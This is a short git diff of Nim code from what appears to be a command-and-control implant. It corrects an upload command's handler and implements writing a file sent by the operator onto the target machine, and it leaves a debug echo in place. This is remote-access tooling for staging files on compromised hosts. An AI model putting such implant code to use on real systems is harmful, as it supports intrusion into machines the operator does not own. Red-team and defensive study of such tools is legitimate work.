@@ -25,7 +25,7 @@ let commands*: seq[Command] =  @[
         arguments: @[
             Argument(name: protect("file"), description: protect("Path to file to upload to the target machine."), argumentType: BINARY, isRequired: true),
         ],
-        execute: executeDownload
+        execute: executeUpload
     )
 ]
 
@@ -67,11 +67,21 @@ when defined(agent):
 
     proc executeUpload(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            var fileBytes: seq[byte] = task.args[0].data
+            var arg: string = Bytes.toString(task.args[0].data) 
 
-            
+            echo arg
 
+            # Parse binary argument
+            var unpacker = Unpacker.init(arg) 
+            let 
+                fileName = unpacker.getDataWithLengthPrefix() 
+                fileContents = unpacker.getDataWithLengthPrefix() 
 
+            # Write the file to the current working directory
+            let destination = fmt"{paths.getCurrentDir()}\{fileName}"
+            writeFile(fmt"{destination}", fileContents)
+
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}." & "\n"))
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
